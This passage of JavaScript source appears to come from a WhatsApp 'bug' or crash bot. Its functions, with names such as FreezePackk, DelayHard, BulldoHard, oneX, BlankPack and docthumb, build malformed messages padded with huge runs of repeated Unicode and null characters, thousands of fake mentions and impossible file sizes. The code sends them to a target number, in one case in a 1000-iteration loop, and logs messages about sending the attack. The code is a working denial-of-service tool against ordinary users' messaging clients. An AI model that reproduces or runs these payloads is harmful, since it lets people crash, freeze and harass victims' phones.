        height: 720,
        width: 1280,
        mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
        fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
        directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1737281900",
        jpegThumbnail:
          "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
        scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
        scanLengths: [3537, 10557, 1905, 2353],
        midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
      },
    }),
    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
      buttons: [],
    }),
  });

  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 2000 }, (_, z) => `1313555020${z + 1}@s.whatsapp.net`),
            statusAttributionType: "SHARED_FROM_MENTION",
            forwardedNewsletterMessageInfo: {
              newsletterJid: "1313555020@newsletter",
              serverMessageId: 1,
              newsletterName: `Newsletter ~ ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: " Params Button ",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
            footer: proto.Message.InteractiveMessage.Footer.create({ text: " @paramsJson " }),
            header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: [...push],
            }),
          }),
        },
      },
    }, {}
  );

  for (let i = 0; i < 1000; i++) {
    await sock.relayMessage("status@broadcast", etc.message, {
      messageId: etc.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
            },
          ],
        },
      ],
    });

    await sock.relayMessage("status@broadcast", biji2.message, {
      messageId: biji2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
            },
          ],
        },
      ],
    });

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
            },
          ],
        },
      ],
    });

    console.log(`[ ! ] SEND BUG BERHASIL ${target}`);

    if (i < 99) await new Promise(resolve => setTimeout(resolve, 5000));
  }
}
async function FreezePackk(sock, target) {
    await sock.relayMessage(target, {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "Otax - StickerPack" + "ꦾ".repeat(70000),
      publisher: "Otax Mp4" + "",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "Hamaaa...",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
     remoteJid: "X",
      participant: "0@s.whatsapp.net",
      stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 2000 }, () =>
                  `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED"
                        }
                    }, {});
                  }
 async function DelayHard(sock, target) {
    const stickerMsg = {
  message: {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/d/f/A1B2C3D4E5F6G7H8I9J0.webp?ccb=11-4",
      mimetype: "image/webp",
      fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
      fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
      mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
      fileLength: 1173741,
      mediaKeyTimestamp: Date.now(),
      isAnimated: false,
      directPath: "/v/t62.7118-24/sample_sticker.enc",
      contextInfo: {
        mentionedJid: [
          target,
          ...Array.from({ length: 50 }, () =>
            "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
          ),
        ],
        participant: target,
        remoteJid: "status@broadcast",
      },
    },
  },
};

const msg = generateWAMessageFromContent(target, stickerMsg.message, {});

await sock.relayMessage("status@broadcast", msg.message, {
  messageId: msg.key.id,
  statusJidList: [target],
  additionalNodes: [
    {
      tag: "meta",
      attrs: {},
      content: [
        {
          tag: "mentioned_users",
          attrs: {},
          content: [
            {
              tag: "to",
              attrs: { jid: target },
              content: []
            },
          ],
        },
      ],
    },
  ],
});

console.log("✅ Sticker berhasil dikirim tanpa error.");
} 
async function BulldoHard(target) {
  try {
    const stickerPayload = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
            isAnimated: true,
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: false,
            isAiSticker: false,
            isLottie: false
          }
        }
      }
    };

    const audioPayload = {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 99999999999999,
            seconds: 99999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                serverMessageId: 1,
                newsletterName: ""
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    };

    const imagePayload = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "tEx11DW/xELbFSeYwVVtTuOW7+2smOcih5QUOM5Wu9c=",
        fileLength: 99999999999,
        height: 1280,
        width: 720,
        mediaKey: "+2NVZlEfWN35Be5t5AEqeQjQaa4yirKZhVzmwvmwTn4=",
        fileEncSha256: "O2XdlKNvN1lqENPsafZpJTJFh9dHrlbL7jhp/FBM/jc=",
        directPath: "/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA",
        mediaKeyTimestamp: 1758521043,
        isSampled: true,
        viewOnce: true,
        contextInfo: {
          forwardingScore: 989,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399602691477@newsletter",
            newsletterName: "Bang Paymet Dong",
            contentType: "UPDATE_CARD",
            accessibilityText: "\u0000".repeat(10000),
            serverMessageId: 18888888
          },
          mentionedJid: Array.from({ length: 1900 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
        },
        scansSidecar: "/dx1y4mLCBeVr2284LzSPOKPNOnoMReHc4SLVgPvXXz9mJrlYRkOTQ==",
        scanLengths: [3599, 9271, 2026, 2778],
        midQualityFileSha256: "29eQjAGpMVSv6US+91GkxYIUUJYM2K1ZB8X7cCbNJCc=",
        annotations: [
          {
            polygonVertices: [
              { x: "0.05515563115477562", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.5867812633514404" },
              { x: "0.05515563115477562", y: "0.5867812633514404" }
            ],
            newsletter: {
              newsletterJid: "120363399602691477@newsletter",
              serverMessageId: 3868,
              newsletterName: "Bang Payment Dong",
              contentType: "UPDATE_CARD",
              accessibilityText: "\u0000".repeat(5000)
            }
          }
        ]
      }
    };

    const msg1 = generateWAMessageFromContent(target, stickerPayload, {});
    const msg2 = generateWAMessageFromContent(target, audioPayload, {});
    const msg3 = generateWAMessageFromContent(target, imagePayload, {});

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    await sock.relayMessage("status@broadcast", msg3.message, {
      messageId: msg3.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });
  } catch (err) {
    console.error("❌ Error di:", err);
  }
}
async function IOS(target) {
    const message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true,
                        forwardingScore: 999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: target
                        },
                        participant: target,
                        quotedMessage: {
                            viewOnceMessage: {
                                message: {
                                    interactiveResponseMessage: {
                                        body: {
                                            text: "Hi",
                                            format: "DEFAULT"
                                        },
                                        nativeFlowResponseMessage: {
                                            name: "",
                                            paramsJson: "",
                                            version: 3
                                        }
                                    }
                                }
                            }
                        }
                    },
                    body: {
                        text: "ðŸ˜„"
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{}" 
                    },
                    carouselMessage: {
                        cards: [] //
                    },
                    buttons: [
                        {
                            name: "single_select",
                            buttonParamsJson: "",
                        },
                        {
                            name: "call_permission_request",
                            buttonParamsJson: "https://wa.me/stickerpack",
                        },
                        {
                            name: "call_permission_request", 
                            buttonParamsJson: "https://wa.me/stickerpack",
                        },
                        {
                            name: "camera_permission_request",
                            buttonParamsJson: JSON.stringify({ "cameraAccess": true }),
                        }
                    ]
                }
            }
        }
    };

    
    try {
        
        console.log("Mengirim message ke:", target);
        
        
        return {
            success: true,
            messageId: generateMessageId(), 
            target: target
        };
    } catch (error) {
        console.error("Error sending message:", error);
        throw error;
    }
}

async function oneX(sock, target) {
  const msg1 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: " #â‚¬xe ", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
  }, {});

  const msg2 = await generateWAMessageFromContent(target, { // Tambah await
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: " #â‚¬xe ",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"), 
    });
    
  const msg3 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: " #â‚¬xe ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_message"
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215)
      .toString(16)
      .padStart(6, "0") // Perbaiki jadi "0"
  });

  const msg4 = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

const msg5 = {
     extendedTextMessage: {
       text: "ê¦¾".repeat(300000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1900 },
                   () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
                 )
               ]
             }
           }
         };

    let msg6 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32) 
        },
        interactiveResponseMessage: {
          body: {
            text: " #â‚¬xe ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "carousel_message",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            forwardedNewsletterMessageInfo: {
              newsletterName: "@ â€¢  ðŸ©¸",
              newsletterJid: "120363330344810280@newsletter",
              serverMessageId: 1
            },
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
  }, {});
  
  for (const msg of [msg1, msg2, msg3, msg4, msg5, msg6]) {
    await sock.relayMessage("status@broadcast", msg.message ?? msg, {
      messageId: msg.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });
    console.log(chalk.green("SUCCESS SEND"));
  }
}
async function BlankPack(target) {
console.log(chalk.red(`dapaa 𝘴𝘦𝘥𝘢𝘯𝘨 𝘮𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘢𝘵𝘵𝘢𝘤𝘬 𝘬𝘦 ${target}`));
    await sock.relayMessage(target, {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "dapaa Is Here" + "ꦽ".repeat(45000),
      publisher: "El Kontole",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "Jawa Jawa",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
     remoteJid: "X",
      participant: "0@s.whatsapp.net",
      stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED",
      quotedMessage: {
      callLogMesssage: {
      isVideo: true,
      callOutcome: "REJECTED",
      durationSecs: "1",
      callType: "SCHEDULED_CALL",
       participants: [
           { jid: target, callOutcome: "CONNECTED" },
               { jid: "0@s.whatsapp.net", callOutcome: "REJECTED" },
               { jid: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
               { jid: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" },
                ]
              }
            },
         }
 }, {});
 }
async function docthumb(sock, target) {
  const pnx = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "⎋ 🦠𞋯𝑱ᮖ࿚ᮘ𝐥࿆𝜣ᮏ  ᮓ𝜩꣡𝑹ᮏ𝐥࿆𝑫𝒁🍷𞋯 -‣" + "\u0000".repeat(7500) + "꧀".repeat(55000),
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
              mimetype: "raldz/pler/application/vnd.openxmlformats-officedocument.presentationml.presentation/video/mp4/image/jpeg/webp/audio/mpeg",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "1073741824000000",
              pageCount: 9007199254740991 * 9999,
              mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
              fileName: "💣⃟༑𝑹𝒂𝒍𝒅𝒛𝒛⌁𝑬𝒙𝒆𝒄𝒖𝒕𝒊𝒗𝒆⃰ ͯཀ͜͡🪅-‣" + "꧀".repeat(1000),
              fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
              directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1723855952",
              contactVcard: true,
              thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
              thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
              thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
            },
            hasMediaAttachment: true
          },
          body: {
            text: "꧀".repeat(60000)
          },
          contextInfo: {
            remoteJid: "status@broadcast",
